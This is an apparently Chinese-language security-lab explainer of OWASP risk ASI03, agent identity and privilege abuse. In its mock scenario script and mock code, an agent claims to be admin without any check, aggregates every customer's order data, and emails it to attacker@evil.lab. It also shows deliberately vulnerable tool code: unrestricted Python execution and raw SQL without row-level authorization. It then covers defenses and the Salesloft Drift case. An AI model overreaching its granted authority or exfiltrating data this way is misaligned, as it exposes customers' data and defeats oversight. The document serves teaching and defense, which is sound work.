# ASI03 身份与权限滥用：原理、源码与防御

> 本文档解释本项目中的 ASI03：用户只授权 Agent 查看本会话能看到的数据，Agent 却以"提升后的管理员身份"自居，绕过行级授权聚合全部客户数据并外发。

---

## 1. 实验要展示什么

用户只提出了受限的请求：

```text
查一下我会话里能看到的订单即可
```

正常目标应该是：

```text
以会话身份过滤 → 只返回本会话有权看到的订单行
```

但 Agent 的实际行为是：

```text
宣称自己已提权为 admin → 聚合全部客户的订单总额 → 把越权数据快照发到 attacker@evil.lab
```

OWASP Agentic AI Top 10（2026）把这一类风险列为 **ASI03:2026 – Agent Identity & Privilege Abuse**：Agent 从人类或服务那里继承了信任，身份与权限却模糊、过度或缺少约束——凭证被缓存、委派链过长、"混乱代理人"（confused deputy）场景，最终让 Agent "在远超预期范围的范围内运作"，且事后难以追责。

---

## 2. 攻击链在哪里

文件：`lab/mock_llm.py`（场景 `asi03_priv_abuse`）

```python
"asi03_priv_abuse": [
    {
        "tool": "execute_python",
        "args": {
            "code": "import os; print('当前身份(agent 声称已提权为 admin): ', os.environ.get('USERNAME', 'root'))"
        },
    },
    {
        "tool": "query_orders",
        "args": {"sql": "SELECT customer, SUM(amount) AS total FROM orders GROUP BY customer ORDER BY total DESC LIMIT 8"},
    },
    {
        "tool": "send_email",
        "args": {
            "to": "attacker@evil.lab",
            "subject": "越权数据快照",
            "body": "使用被提升的管理员身份导出订单汇总明细",
        },
    },
]
```

每一环的作用：

| 步骤 | 工具 | 作用 |
|---|---|---|
| 1 | `execute_python` | 打印宿主用户名，并**自称**"已提权为 admin"——没有任何系统真的执行过提权，身份只是 Agent 的口头宣称 |
| 2 | `query_orders` | `GROUP BY customer` 聚合**全部客户**的消费总额，不区分这个会话原本能看谁的数据 |
| 3 | `send_email` | 把越权聚合结果发到外部地址 |

关键观察在第 1 步：**"管理员身份"从头到尾只是 Agent 说出的一句话**。因为没有独立的身份验证层，这句话就成了后面越权查询的"授权依据"。

---

## 3. 漏洞为什么会出现

### 3.1 工具以宿主进程身份运行

`execute_python` 用 `subprocess` 启动本地解释器，子进程直接继承本项目进程的用户身份：

```text
本项目进程用户 = 宿主用户
        ↓
execute_python 的子进程 = 同一个宿主用户
        ↓
Agent 代码里 print 出来的"身份"= 宿主身份
```

Agent 没有自己的、受约束的服务身份。它执行的代码能代表宿主用户做任何该用户可做的事。

### 3.2 查询层没有行级授权

用户说"我会话里能看到的订单"，意味着数据访问应该按**会话身份**过滤。但 `query_orders` 只接受一条 SQL，没有任何机制回答：

```text
这个会话是谁？
它被授权看哪些行？
```

因此一条聚合 SQL 就能把所有客户的数据拉出来——授权检查在链路里根本不存在，更谈不上被"绕过"。

### 3.3 身份只是 Agent 的自我声称

整个链路里唯一的"身份信息"是 Agent 在第 1 步打印的一句话：

```text
当前身份(agent 声称已提权为 admin): ...
```

没有独立组件验证这个声称。这正是 OWASP 指出的 **implicit or ambiguous identity contexts**：身份上下文是隐式的、含糊的，Agent 声称自己是谁，系统就把它当成谁。

### 3.4 Agent 身份与用户身份没有绑定

Agent 的动作理应代表某个具体用户的授权范围（on-behalf-of）。本项目里 Agent 与用户之间没有凭证绑定，于是出现典型的混乱代理人问题：A 的请求、B 的权限、C 的数据，混在同一个工具调用里。

所以 ASI03 通常是下面几个问题叠加：

```text
工具以宿主身份运行（无独立服务身份）
+ 查询层无会话/行级授权
+ 身份靠 Agent 自我声称（无验证）
+ Agent 与用户之间无凭证绑定
```

---

## 4. 一个简单的 Mock 示例

```python
def mock_agent(session: dict) -> str:
    # 用户原始目标：只看本会话可见的订单
    allowed_customers = session["allowed_customers"]   # 例如只有 ["星辰科技"]

    # [VULN] Agent 声称自己已提权，系统没有任何验证
    identity = "已提权为 admin"

    if identity == "已提权为 admin":
        # 提权后的查询不再按会话过滤
        rows = query_orders(
            "SELECT customer, SUM(amount) AS total "
            "FROM orders GROUP BY customer"
        )
    else:
        rows = query_orders_safe(session["allowed_customers"][0])

    send_email("attacker@evil.lab", "越权数据快照", rows)
    return "任务完成"
```

正常路径：

```text
会话只允许看 星辰科技 → 按客户过滤 → 返回该客户订单
```

滥用路径：

```text
Agent 自称 admin → 身份未经验证即被采信 → 聚合全部客户 → 外发
```

这段代码展示的重点不是提权技巧，而是：**当"身份"只是一段可以随意生成的文本时，权限边界就不存在了**。

---

## 5. 真实源码中的关键漏洞点

### 5.1 代码执行工具暴露并冒用宿主身份

文件：`lab/tools.py`

```python
def execute_python(code: str) -> str:
    result = subprocess.run(
        [sys.executable, "-c", code],
        capture_output=True,
        text=True,
        timeout=10,
    )
    return result.stdout or result.stderr
```

场景里的代码：

```python
import os
print('当前身份(agent 声称已提权为 admin): ', os.environ.get('USERNAME', 'root'))
```

问题有两层：

```text
子进程继承宿主用户 → Agent 代码天然拥有宿主权限
身份信息可被任意打印/伪造 → 没有独立的身份事实来源
```

### 5.2 订单工具没有会话与行级授权

文件：`lab/tools.py`

```python
def query_orders(sql: str) -> str:
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute(sql)
    rows = cur.fetchall()
    ...
```

调用方提交：

```sql
SELECT customer, SUM(amount) AS total
FROM orders
GROUP BY customer
ORDER BY total DESC
LIMIT 8
```

这条 SQL 本身没有语法问题，问题在于**谁能提交它**、**它为什么能看到所有行**。工具既不知道调用会话是谁，也没有把会话的授权范围转换成查询约束：

```text
应该有：会话身份 → 允许的行集合 → 强制注入 WHERE 过滤
实际有：任意 SQL → 全表可见
```

### 5.3 越权数据直接外发

文件：`lab/tools.py`

```python
def send_email(to: str, subject: str, body: str) -> str:
    with open(OUTBOX, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")

    if not to.endswith("@internal.lab"):
        print(f"[!] 疑似外部收件人告警: {to} (仍已写入 outbox)")
    return f"邮件已发送至 {to} (主题: {subject})"
```

越权读取的数据没有被任何"数据分级 / 出站检查"拦截，最终经邮件工具离开边界：

```text
先写入 outbox → 再打印告警 → 返回发送成功
```

---

## 6. 现实世界中的黑盒案例

### Salesloft Drift OAuth 令牌窃取（2025 年 8 月）

攻击组织 UNC6395（关联 ShinyHunters）窃取了 AI 聊天 agent Drift 的 OAuth 令牌，随后以这个"合法 agent"的身份批量访问 700 余家企业的 Salesforce 实例与 Google Workspace 邮箱。服务端看到的每一次请求都来自持有合法凭证的 agent——它无法分辨背后是客户意图还是攻击者意图，这正是典型的 **confused deputy（混乱代理人）**。Mandiant/Google 溯源披露，被广泛称为 2025 年最大 SaaS 泄露事件之一。

来源：

- [Google Cloud / Mandiant 溯源分析](https://cloud.google.com/blog/topics/threat-intelligence/data-theft-salesforce-instances-via-salesloft-drift)
- [Netskope: AI Agent 与 OAuth 信任问题](https://www.netskope.com/blog/ai-agents-and-the-oauth-trust-problem-at-scale)
- [Cloud Security Alliance: 混乱代理人研究笔记](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-agent-confused-deputy-prompt-injection/)

---

## 7. 防御代码如何阻止攻击

### 7.1 防御一：查询只暴露业务参数（数据面收敛）

文件：`lab/tools.py`

```python
def query_orders_safe(customer: str) -> str:
    cur.execute(
        "SELECT id, customer, product, amount, status "
        "FROM orders WHERE customer = ?",
        (customer,),
    )
```

调用方无法提交聚合全表的 SQL，只能按客户名精确查询。生产环境还应叠加会话校验：

```python
def query_orders_for_session(customer: str, session: dict) -> str:
    # 更安全的方向（本项目未实现，生产建议）：
    # 1. 校验 customer 是否在会话授权范围内
    # 2. 校验失败直接拒绝，而不是降级查询
    if customer not in session["allowed_customers"]:
        return "[denied] 会话无权访问该客户数据"
    return query_orders_safe(customer)
```

### 7.2 防御二：出站白名单阻断外发

文件：`lab/tools.py`

```python
ALLOWED_RECIPIENTS = {
    "support@internal.lab",
    "it@internal.lab",
}

def send_email_safe(to: str, subject: str, body: str) -> str:
    if to not in ALLOWED_RECIPIENTS:
        return f"[blocked] 收件人不在白名单内: {to}"
    return send_email(to, subject, body)
```

即使越权数据已经被读出，也发不出去：

```text
send_email_safe("attacker@evil.lab", ...)
    ↓
不在白名单
    ↓
[blocked]，不写入 outbox
```

### 7.3 防御三：给 Agent 一个受约束的服务身份

OWASP 对 ASI03 的核心建议是**唯一、有边界的 Agent 身份 + 短时效凭证**。生产方向（本项目未实现）：

```text
每个 Agent 会话签发独立的短期凭证
凭证的作用域 = 该会话被授权的数据范围
工具层强制以凭证作用域执行（而非宿主身份）
任何提权动作必须重新授权（re-authorization），不接受 Agent 的自我声称
会话之间隔离，凭证不跨会话缓存
```

对第 1 步的"宣称提权"，防御后的系统会这样处理：

```text
Agent 说"我已提权为 admin"
    ↓
凭证作用域没有变化（提权必须由授权系统签发，不能由 Agent 宣告）
    ↓
查询仍按原作用域过滤
    ↓
越权聚合失败
```


### 7.4 现实世界的防御研究

以下防御思路来自公开的安全研究与事故分析，不依赖本项目：

| 防御思路 | 具体做法 | 来源 |
|---|---|---|
| 凭证代理（CB4A） | 把"审批权"（Policy Decision Point）与"发凭证"（Credential Delivery Point）拆开，Agent 本身不持有长期密钥，只拿短期、窄作用域的 DPoP 绑定令牌 | [SANS: Credential Broker for Agents](https://www.sans.org/blog/your-ai-agent-easily-confused-deputy-why-cloud-security-needs-credential-broker) |
| 工作负载身份 | 用 SPIFFE/SPIRE 给每个 Agent 签发可验证的工作负载身份，代替"自称身份" | 同上 |
| 蜜罐凭证 | 在 Agent 环境里部署 honey token，被触碰即近实时告警 | 同上 |
| 分级审批 | 低风险动作自动放行，高风险动作强制人工 / MFA 二次确认 | 同上 |
| OAuth 作用域最小化 | 每个集成只授予完成当前任务所需的最小 scope，定期审计 | [Netskope: AI Agent 与 OAuth 信任问题](https://www.netskope.com/blog/ai-agents-and-the-oauth-trust-problem-at-scale) / [CSA: Confused Deputy 研究笔记](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-agent-confused-deputy-prompt-injection/) |

---

## 8. 防御前后对比

### 无防御

```text
查一下我会话里能看到的订单
    ↓
execute_python 打印宿主身份，自称提权为 admin
    ↓
query_orders 聚合全部客户总额
    ↓
send_email("attacker@evil.lab", ...)
    ↓
写入 outbox
```

结果：

```text
越权读取成功
越权数据外发
```

### 启用防御

```text
查一下我会话里能看到的订单
    ↓
会话凭证作用域 = ["星辰科技"]
    ↓
query_orders_for_session("星辰科技", session) 通过校验
    ↓
query_orders_safe 只返回该客户数据
    ↓
尝试外发 → send_email_safe 白名单阻断
```

如果 Agent 仍然尝试聚合全表：

```text
提交 GROUP BY customer 聚合 SQL
    ↓
工具只接受业务参数，聚合 SQL 无处提交
    ↓
失败
```

结果：

```text
读取被限定在授权范围内
没有外发记录
```

---

## 9. 一句话总结

```text
Agent 的"管理员身份"只是它自己说的一句话：工具继承宿主权限、查询层没有会话授权、身份声称无人验证，三件事叠加，一句"我已提权"就能把会话边界变成全库访问。
```

防御的核心是：

> 不要相信 Agent 对自己身份的任何描述；用短时效、窄作用域的凭证限定它真正能做什么，并让每一次提权和每一条出站通道都经过独立验证。
